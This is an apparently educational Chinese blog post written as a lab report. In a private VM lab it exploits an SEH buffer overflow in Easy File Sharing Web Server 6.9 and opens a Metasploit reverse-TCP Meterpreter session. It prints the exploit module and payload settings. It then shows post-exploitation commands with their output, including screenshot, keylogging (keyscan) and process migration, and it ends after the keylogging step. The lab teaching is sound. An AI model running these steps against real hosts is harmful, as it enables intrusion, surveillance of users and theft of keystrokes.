@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>EasyFileSharing-溢出利用与 Meterpreter 会话建立 | 不可信输入</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="上一篇只把服务打崩、弹了个计算器。这一篇走完剩下的路：把同一个溢出点换一种载荷，让靶机主动连回来，拿到一个可以反复下命令的会话——然后再用四条命令证明「我确实坐在了对方的机器里」。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EasyFileSharing-溢出利用与 Meterpreter 会话建立">
+<meta property="og:url" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/index.html">
+<meta property="og:site_name" content="不可信输入">
+<meta property="og:description" content="上一篇只把服务打崩、弹了个计算器。这一篇走完剩下的路：把同一个溢出点换一种载荷，让靶机主动连回来，拿到一个可以反复下命令的会话——然后再用四条命令证明「我确实坐在了对方的机器里」。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig1-chain.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig2-capability.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig3-nmap.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig4-ie.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig5-msf-search.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig6-options.jpeg">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig7-session.jpeg">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig8-sysinfo.jpeg">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig9-ps.jpeg">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig10-keyscan.jpeg">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig11-upload.png">
+<meta property="og:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig12-desktop.jpeg">
+<meta property="article:published_time" content="2026-11-10T00:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-09T16:29:34.239Z">
+<meta property="article:author" content="Traintedz">
+<meta property="article:tag" content="Easy File Sharing">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="Meterpreter">
+<meta property="article:tag" content="SEH">
+<meta property="article:tag" content="反弹连接">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shu278.github.io/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig1-chain.png">
+  
+    <link rel="alternate" href="/atom.xml" title="不可信输入" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">不可信输入</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://shu278.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-EasyFileSharing-溢出利用与Meterpreter会话建立" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/" class="article-date">
+  <time class="dt-published" datetime="2026-11-10T00:30:00.000Z" itemprop="datePublished">2026-11-10</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/">网络渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      EasyFileSharing-溢出利用与 Meterpreter 会话建立
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>上一篇只把服务打崩、弹了个计算器。这一篇走完剩下的路：把同一个溢出点换一种载荷，让靶机主动连回来，拿到一个可以反复下命令的会话——然后再用四条命令证明「我确实坐在了对方的机器里」。</p>
+<span id="more"></span>
+
+<h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>本实验以 Easy File Sharing Web Server（以下简称为 EFS）的 SEH 溢出漏洞为对象，在两台虚拟机之间完成从服务识别到远程会话控制的完整过程。具体目标如下。</p>
+<ul>
+<li>掌握「识别—检索—验证—利用—控制」五个阶段的完整利用链路，能说明每一阶段的产出如何成为下一阶段的输入。</li>
+<li>掌握 Metasploit 框架中模块选择、载荷设置与目标参数配置的方法，理解参数名随版本变化的原因与应对方式。</li>
+<li>理解反弹连接相对于正向连接在穿透边界防护上的差异，能解释会话为何能够建立。</li>
+<li>掌握 Meterpreter 的身份确认、屏幕取证、键盘记录与文件传输操作，并能说明每项操作的取证意义。</li>
+</ul>
+<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p>实验由两台 VirtualBox 虚拟机完成，二者接入同一 NAT 网络，宿主机不直接参与通信。环境信息见表 1。</p>
+<p><em>表 1　实验环境</em></p>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统与版本</th>
+<th>网络地址</th>
+<th>关键说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux 2026.2</td>
+<td>192.168.64.4（DHCP）</td>
+<td>Metasploit 6.x、Exploit-DB 本地库</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>Windows 7 SP1 x64</td>
+<td>192.168.64.100（静态）</td>
+<td>Easy File Sharing Web Server 6.9</td>
+</tr>
+<tr>
+<td>网络</td>
+<td>VirtualBox NAT 网络</td>
+<td>192.168.64.0&#x2F;24</td>
+<td>宿主机无法直连，测试须在虚拟机内完成</td>
+</tr>
+</tbody></table>
+<p>表 1 中有两点直接影响实验能否复现，需特别说明。</p>
+<ul>
+<li>攻击机地址由 DHCP 动态分配，重启后可能变化。每次实验前应用 <code>hostname -I</code> 重新确认 LHOST，不能沿用上次的数值。</li>
+<li>靶机服务端口在安装时被改为 8000（默认 80），因此 RPORT 必须填 8000。端口填错时框架不会给出明确提示，只会表现为「攻击已发送但无会话」。</li>
+</ul>
+<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>原理部分回答三个问题：漏洞为什么能成立，会话为什么能建立，拿到的权限为什么有限。至于每个字节的偏移量与具体排布，在上一篇《EasyFileSharing-缓冲区溢出漏洞的扫描定位与利用》里已经逐字节拆过，这里不再重复。</p>
+<h3 id="3-1-攻击链总览"><a href="#3-1-攻击链总览" class="headerlink" title="3.1　攻击链总览"></a>3.1　攻击链总览</h3><p>完整的利用过程可以拆成五个阶段，如图 1 所示。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig1-chain.png" class="">
+
+<p><em>图 1　从侦察到远程控制的五阶段攻击链</em></p>
+<p>这五个阶段不是并列的清单，而是一条流水线：每一步的产出，都是下一步唯一的输入。各阶段的主要动作与产出见表 2。</p>
+<p><em>表 2　五个阶段的主要动作与产出</em></p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>主要动作</th>
+<th>产出（下游依赖它的什么）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>侦察</td>
+<td>端口与服务版本识别</td>
+<td>软件名与版本号，作为检索关键词</td>
+</tr>
+<tr>
+<td>检索</td>
+<td>查询本地 Exploit-DB 索引</td>
+<td>漏洞名与 PoC 路径</td>
+</tr>
+<tr>
+<td>验证</td>
+<td>运行现成 PoC</td>
+<td>确认漏洞真实存在、偏移量可用</td>
+</tr>
+<tr>
+<td>利用</td>
+<td>框架加载模块并配置载荷</td>
+<td>一次携带攻击载荷的请求</td>
+</tr>
+<tr>
+<td>控制</td>
+<td>靶机回连攻击机</td>
+<td>可交互的会话通道</td>
+</tr>
+</tbody></table>
+<p>把这条链放回本实验的具体环境，可以看得更清楚：Nmap 从 8000 端口的响应中匹配出「Easy File Sharing Web Server 6.9」，这个字符串成为检索的关键词；检索在本地漏洞库中定位到针对 SEH 路径的攻击脚本，脚本里写明了请求字段与偏移量；验证阶段运行现成脚本，确认漏洞在本机环境真实可用；利用阶段改用框架发送同类畸形请求，只把末尾的载荷换掉，从「弹出一个计算器」变成「连回攻击机 4444 端口」；控制阶段则由靶机主动回连，建立可反复下命令的通道。</p>
+<p>需要说明的是，验证与利用两个阶段针对的是同一处溢出，模块内置的偏移量在本环境的 6.9 版本上同样有效，这一点已由会话成功建立所验证。二者的差别只在载荷：验证阶段执行的是会破坏进程的 shellcode，因此服务随即崩溃；利用阶段注入的是独立运行的 stage，因此会话能够稳定保持。</p>
+<h3 id="3-2-漏洞成因：栈溢出与-SEH-劫持"><a href="#3-2-漏洞成因：栈溢出与-SEH-劫持" class="headerlink" title="3.2　漏洞成因：栈溢出与 SEH 劫持"></a>3.2　漏洞成因：栈溢出与 SEH 劫持</h3><p>EFS 在处理超长的请求字段时没有做长度校验，写入的数据越过缓冲区边界，自低地址向高地址依次漫过栈上的四块区域，见表 3。</p>
+<p><em>表 3　栈上四块区域及其覆盖后果</em></p>
+<table>
+<thead>
+<tr>
+<th>栈上区域</th>
+<th>存放什么</th>
+<th>被覆盖后的后果</th>
+<th>是否利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>局部缓冲区</td>
+<td>请求字段的原始内容</td>
+<td>溢出源头，数据由此向外漫出</td>
+<td>利用起点</td>
+</tr>
+<tr>
+<td>保存的 EBP</td>
+<td>上一层函数的栈底</td>
+<td>栈帧错乱</td>
+<td>不直接利用</td>
+</tr>
+<tr>
+<td>返回地址 RET</td>
+<td>函数返回后的下一跳</td>
+<td>函数一返回即跳向指定地址</td>
+<td>否，程序先崩溃</td>
+</tr>
+<tr>
+<td>SEH 记录</td>
+<td>next 指针与 handler 地址</td>
+<td>异常发生时跳向指定地址</td>
+<td>是，本实验利用点</td>
+</tr>
+</tbody></table>
+<p>数据只能从低地址向高地址增长，而这四块在栈上恰好按此顺序排列，所以「依次覆盖」并不是什么技巧，而是溢出的必然结果。所谓构造 payload，就是按这个顺序把数据一块块摆好，每一块的字节数都必须精确，多一个或少一个，后面全部错位。</p>
+<p>本实验没有选择覆盖返回地址，而是选择覆盖 SEH 记录，原因在于执行顺序：畸形请求先触发越界访问异常，程序在函数返回之前就已经进入异常处理流程，<code>ret</code> 指令根本没有执行机会。异常处理是崩溃前的最后一个出口，也只能在这里拦截。具体的劫持过程可以概括为三步。</p>
+<ul>
+<li>SEH 记录中的 handler 地址被改写为一段固定地址，该地址位于软件自带的 DLL 中，位置稳定；这是整个 payload 中唯一需要预先确定的地址。</li>
+<li>该地址指向一段 pop-pop-ret 指令，作用是剥掉异常框架压入的两个参数；剥完之后，<code>ret</code> 读到的恰好是系统给出的现场指针，它天然指向栈上。</li>
+<li>栈上依次布置短跳指令、NOP 滑板与 shellcode。短跳只需跳到滑板范围内的任意位置，滑板再一路执行进 shellcode——用「落点范围」代替「精确地址」，从而绕开栈地址不确定的问题。</li>
+</ul>
+<p>同一服务往往存在多个可触发字段，公开 PoC 也有多份，分别对应不同的请求字段，但底层成因相同。报告只选定一条路径做透，不逐一展开。</p>
+<h3 id="3-3-会话为何能建立：反弹连接"><a href="#3-3-会话为何能建立：反弹连接" class="headerlink" title="3.3　会话为何能建立：反弹连接"></a>3.3　会话为何能建立：反弹连接</h3><p>载荷并不要求靶机开放新端口等待连接，而是让靶机主动连回攻击机的 4444 端口。方向反过来，性质就变了，对比见表 4。</p>
+<p><em>表 4　正向连接与反向连接的对比</em></p>
+<table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>正向连接（bind）</th>
+<th>反向连接（reverse，本实验）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>发起方</td>
+<td>攻击机连接靶机</td>
+<td>靶机连接攻击机</td>
+</tr>
+<tr>
+<td>靶机需开放</td>
+<td>一个新的监听端口</td>
+<td>不需要，复用已有服务</td>
+</tr>
+<tr>
+<td>边界设备</td>
+<td>入站规则通常拦截</td>
+<td>出站连接通常放行</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>同网段、无 NAT</td>
+<td>跨网段、存在 NAT 或防火墙</td>
+</tr>
+</tbody></table>
+<p>因此会话建立那一行输出值得单独解读：括号中左侧是攻击机在监听，右侧是靶机用临时端口发起连接，箭头方向即为连接发起方向。这一行同时证明了两件事——溢出已经成功，回连也已经打通。</p>
+<h3 id="3-4-会话为何是-32-位、权限为何有限"><a href="#3-4-会话为何是-32-位、权限为何有限" class="headerlink" title="3.4　会话为何是 32 位、权限为何有限"></a>3.4　会话为何是 32 位、权限为何有限</h3><p>本次实验最容易产生误解的一点是：系统是 64 位，拿到的会话却是 x86。原因与操作系统无关，而与承载载荷的进程有关，见表 5。</p>
+<p><em>表 5　会话位数的成因</em></p>
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>事实</th>
+<th>带来的影响</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Windows 7 SP1，x64</td>
+<td>支持 32 位与 64 位进程并存</td>
+</tr>
+<tr>
+<td>被利用进程</td>
+<td>Fsws.exe 为 32 位程序</td>
+<td>载荷只能注入 32 位上下文</td>
+</tr>
+<tr>
+<td>会话类型</td>
+<td>meterpreter x86&#x2F;windows</td>
+<td>部分 64 位专属命令受限</td>
+</tr>
+<tr>
+<td>应对措施</td>
+<td>migrate 迁移到其他进程</td>
+<td>会话更稳定，且可脱离易崩溃的服务进程</td>
+</tr>
+</tbody></table>
+<p>另一个容易误读的是权限。<code>getuid</code> 返回的是运行该服务的普通账户，而不是 SYSTEM。载荷被注入 EFS 的进程，继承的正是 EFS 自身的权限，因此「拿到会话」与「拿到最高权限」是两件事。这一点在之后还会用到：同一条漏洞，若服务以 SYSTEM 运行，危害将被成倍放大。</p>
+<h3 id="3-5-Meterpreter-的能力构成"><a href="#3-5-Meterpreter-的能力构成" class="headerlink" title="3.5　Meterpreter 的能力构成"></a>3.5　Meterpreter 的能力构成</h3><p>会话建立之后，各项命令对应的是性质不同的能力，可以归为识别、观察、采集、传输四类，见图 2。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig2-capability.png" class="">
+
+<p><em>图 2　会话建立后各项控制能力及其证据</em></p>
+<p>区分这些能力有实际意义：执行 <code>sysinfo</code> 说明「知道对方是谁」，执行 <code>screenshot</code> 说明「能看见对方屏幕」，执行 <code>keyscan</code> 说明「能采集对方输入」，执行 <code>upload</code> 说明「能向对方写入文件」。报告陈述结果时应当按能力逐项对应，而不是笼统地写「实现了远程控制」。</p>
+<h2 id="四、实验步骤与结果"><a href="#四、实验步骤与结果" class="headerlink" title="四、实验步骤与结果"></a>四、实验步骤与结果</h2><p>以下按实际操作顺序记录，每节给出命令、关键输出与判读。文中截图均为实验现场的原始截屏，未做修改。</p>
+<h3 id="4-1-确认目标服务可用"><a href="#4-1-确认目标服务可用" class="headerlink" title="4.1　确认目标服务可用"></a>4.1　确认目标服务可用</h3><p>先确认通路与端口状态。这一步不通过，后面的命令都会打在空处。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping -c 3 192.168.64.100</span><br><span class="line"><span class="built_in">sudo</span> nmap -sV -p 8000 192.168.64.100</span><br></pre></td></tr></table></figure>
+
+<p>第一次扫描时，ping 正常返回 3 个包、丢包率 0%，但 8000 端口显示为 closed。closed 与 filtered 含义不同：closed 表示目标主机明确回应了拒绝（TCP RST），说明主机在线、防火墙未拦截，只是没有程序监听该端口；filtered 才是数据包被丢弃、没有任何回应。据此可以判断是服务未运行，而不是网络问题。</p>
+<p>在靶机侧启动 EFS 后复查，得到 <code>8000/tcp open</code>，并识别出 Easy File Sharing Web Server httpd 6.9，同时给出操作系统信息 Windows。至此才具备后续攻击的前提。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig3-nmap.png" class="">
+
+<p><em>图 3　端口状态由 closed 变为 open，并识别出软件名与版本</em></p>
+<p>为交叉印证，另在靶机自带的 IE 中访问 <code>http://192.168.64.100:8000</code>，页面正常显示 EFS 登录界面，说明服务确实在线且可交互。该页面后续也用于键盘记录的操作验证。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig4-ie.png" class="">
+
+<p><em>图 4　靶机浏览器访问 8000 端口，EFS 登录页正常显示</em></p>
+<h3 id="4-2-启动框架并加载模块"><a href="#4-2-启动框架并加载模块" class="headerlink" title="4.2　启动框架并加载模块"></a>4.2　启动框架并加载模块</h3><p>启动框架并选定模块。<code>msfconsole</code> 启动需要十余秒，界面暂时静止属正常现象。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">search easyfilesharing</span><br><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br></pre></td></tr></table></figure>
+
+<p>搜索返回四条结果，分别对应 FTP 服务的 PASS 溢出、HTTP 服务的 POST 溢出与 SEH 溢出。本实验选取第四条，即 SEH 路径。加载成功的判据是提示符括号内变为模块路径。</p>
+<p>此时出现 <code>No payload configured, defaulting to windows/meterpreter/reverse_tcp</code>，这一行是提示而非错误，含义是未指定载荷、已自动采用默认值，而该默认值恰好就是本次所需的载荷。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig5-msf-search.png" class="">
+
+<p><em>图 5　搜索模块并加载 SEH 路径</em></p>
+<h3 id="4-3-配置参数"><a href="#4-3-配置参数" class="headerlink" title="4.3　配置参数"></a>4.3　配置参数</h3><p>配置载荷与目标参数。顺序不能颠倒：LHOST、LPORT 属于载荷选项，未设置载荷时它们不会出现在选项列表中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.64.100</span><br><span class="line"><span class="built_in">set</span> rport 8000</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p>参数名须以 <code>show options</code> 的 Name 列为准。本版框架中目标地址写作 RHOSTS（复数）。</p>
+<p>设置完成后复查，四项关键值与预期一致：RHOSTS 为 192.168.64.100，RPORT 为 8000，LHOST 为 192.168.64.4，LPORT 为 4444。其中 LHOST 由框架自动识别为本机地址，一般无需手动设置。任何一项与表 6 不符，都必须先改对再执行。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig6-options.jpeg" class="">
+
+<p><em>图 6　参数设置后的选项复查结果</em></p>
+<p><em>表 6　四个关键参数及其填错后果</em></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+<th>本次取值</th>
+<th>填错的后果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RHOSTS</td>
+<td>靶机地址</td>
+<td>192.168.64.100</td>
+<td>请求发往不存在的目标</td>
+</tr>
+<tr>
+<td>RPORT</td>
+<td>靶机服务端口</td>
+<td>8000</td>
+<td>请求打到错误端口，无响应</td>
+</tr>
+<tr>
+<td>LHOST</td>
+<td>回连地址（攻击机）</td>
+<td>192.168.64.4</td>
+<td>靶机回连到不可达地址，会话建立失败</td>
+</tr>
+<tr>
+<td>LPORT</td>
+<td>回连端口</td>
+<td>4444</td>
+<td>与本机监听端口不一致</td>
+</tr>
+</tbody></table>
+<h3 id="4-4-发起攻击与会话建立"><a href="#4-4-发起攻击与会话建立" class="headerlink" title="4.4　发起攻击与会话建立"></a>4.4　发起攻击与会话建立</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>输出按顺序出现四行：开始在 4444 端口监听、发送攻击请求、向目标传输 stage（192936 字节）、会话建立。前两行说明请求已发出；第三行说明溢出成功、载荷开始在靶机中落地；只有最后一行才代表通道真正打通。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig7-session.jpeg" class="">
+
+<p><em>图 7　攻击执行与会话建立，末行为 session 1 opened</em></p>
+<p>括号内的地址对是理解整个实验的关键：<code>192.168.64.4:4444 -&gt; 192.168.64.100:49164</code>。左侧是攻击机在监听，右侧是靶机用临时端口主动连出，箭头方向即为连接发起方向。</p>
+<p>同时可观察到靶机侧的变化：EFS 窗口关闭，8000 端口不再响应，网站无法访问。这是溢出破坏服务进程的直接后果，也是后续需要做进程迁移的原因——会话当前依附在已被破坏的进程中，服务一旦彻底终止，会话也会随之中断。</p>
+<h3 id="4-5-身份确认与屏幕取证"><a href="#4-5-身份确认与屏幕取证" class="headerlink" title="4.5　身份确认与屏幕取证"></a>4.5　身份确认与屏幕取证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br><span class="line">getuid</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">screenshot</span><br></pre></td></tr></table></figure>
+
+<p>四条命令依次回答「这是哪台机器、以什么身份、站在哪个目录、能否看见屏幕」。实际输出为：计算机名 SHU278-PC，操作系统 Windows 7（6.1 Build 7601, Service Pack 1），架构 x64，系统语言 zh_CN，工作组 WORKGROUP，会话类型 meterpreter x86&#x2F;windows；<code>getuid</code> 返回 <code>shu278-PC\shu278</code>；<code>pwd</code> 返回 <code>C:\Users\shu278\Desktop</code>；<code>screenshot</code> 将画面保存为 <code>/home/kali/HuBCxguz.jpeg</code>。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig8-sysinfo.jpeg" class="">
+
+<p><em>图 8　身份确认与屏幕取证（sysinfo &#x2F; getuid &#x2F; pwd &#x2F; screenshot）</em></p>
+<p>四条输出合起来构成控制权归属的直接证据：受控对象是靶机，当前身份是靶机上的普通用户，工作目录是用户桌面，并且可以实时获取对方屏幕。其中 x64 系统与 x86 会话并存的原因已在 3.4 节说明。</p>
+<h3 id="4-6-进程查看与键盘记录"><a href="#4-6-进程查看与键盘记录" class="headerlink" title="4.6　进程查看与键盘记录"></a>4.6　进程查看与键盘记录</h3><p>在执行键盘记录前，先用 <code>ps</code> 确认进程与位数。输出中可见 <code>Fsws.exe</code>（PID 2068，x86）与 <code>iexplore.exe</code>（PID 2344、2392，x86），前者是承载会话的 EFS 进程，后者是靶机上打开的 IE。</p>
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig9-ps.jpeg" class="">
+
+<p><em>图 9　进程列表与首次键盘记录（记录内容为空）</em></p>
+<p>随后执行键盘记录。第一次 <code>keyscan_dump</code> 只返回 <code>Dumping captured keystrokes...</code> 而其下为空，说明记录器已启动但没有采集到按键。原因有两点：其一，启动为异步操作，钩子挂载存在短暂延迟，启动后立即输入会丢失按键；其二，若在启动之前已经完成输入，则更不可能被记录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start</span><br><span class="line">keyscan_dump</span><br><span class="line">keyscan_stop</span><br></pre></td></tr></table></figure>
+
+<p>修正操作中又出现第二个问题：误按 Ctrl+C 后出现 <code>Interrupt: use the &#39;exit&#39; command to quit</code>，此后连续三次 <code>keyscan_start</code> 均返回 <code>stdapi_ui_start_keyscan: Operation failed: Incorrect function</code>。原因是中断终止了后台线程，已注册的键盘钩子没有随之注销，进程内的状态残留，导致再次挂载失败，且该状态会一直持续。</p>
+<p>处置办法是更换承载进程：执行 <code>migrate 2344</code> 迁移至 <code>iexplore.exe</code> 后，再次启动记录即恢复正常，dump 得到十个退格符与 <code>hello12312345</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">migrate 2344</span><br><span class="line">keyscan_start</span><br><span class="line">keyscan_dump</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/11/10/EasyFileSharing-%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B8%8EMeterpreter%E4%BC%9A%E8%AF%9D%E5%BB%BA%E7%AB%8B/fig10-keyscan.jpeg" class="">
+
